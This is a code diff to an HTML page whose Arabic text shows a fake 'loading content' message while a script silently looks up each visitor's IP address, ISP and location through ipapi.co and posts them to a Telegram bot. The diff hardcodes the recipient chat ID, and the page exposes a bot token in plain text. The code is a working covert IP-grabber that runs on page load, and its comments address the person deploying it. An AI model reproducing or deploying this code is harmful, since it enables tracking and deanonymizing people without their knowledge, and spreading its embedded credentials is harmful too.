@@ -20,9 +20,12 @@
     <p>جاري تحميل المحتوى، انتظر لحظة...</p>
 
     <script>
-        // بيانات البوت
+        // توكن البوت بتاعك
         const BOT_TOKEN = '8979129209:AAFPv860Aomc03pLBPQh4dyW2yIKByB3Bk0';
         
+        // الـ Chat ID بتاعك (حطي الرقم بتاعك بدل ما بين القوسين)
+        const CHAT_ID = '6663398412';
+
         // جلب معلومات الزائر عن طريق الـ IP وإرسالها للتليجرام
         fetch('https://ipapi.co/json/')
             .then(response => response.json())
@@ -34,26 +37,16 @@
                                 `🏢 **مزود الخدمة:** ${data.org || 'غير معروف'}\n` +
                                 `🌐 **عنوان الـ IP:** ${data.ip || 'غير معروف'}`;
 
-                // إرسال البيانات للبوت (سيتم إرسالها لك مباشرة إذا كنت أرسلت /start للبوت)
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
-                    .then(res => res.json())
-                    .then(updateData => {
-                        if (updateData.result && updateData.result.length > 0) {
-                            // جلب آخر Chat ID تواصل مع البوت
-                            const chatId = updateData.result[updateData.result.length - 1].message.chat.id;
-                            
-                            // إرسال الرسالة
-                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    chat_id: chatId,
-                                    text: message,
-                                    parse_mode: 'Markdown'
-                                })
-                            });
-                        }
-                    });
+                // إرسال الرسالة مباشرة للبوت ولرقمك المحدد
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
             })
             .catch(err => console.error('Error:', err));
     </script>
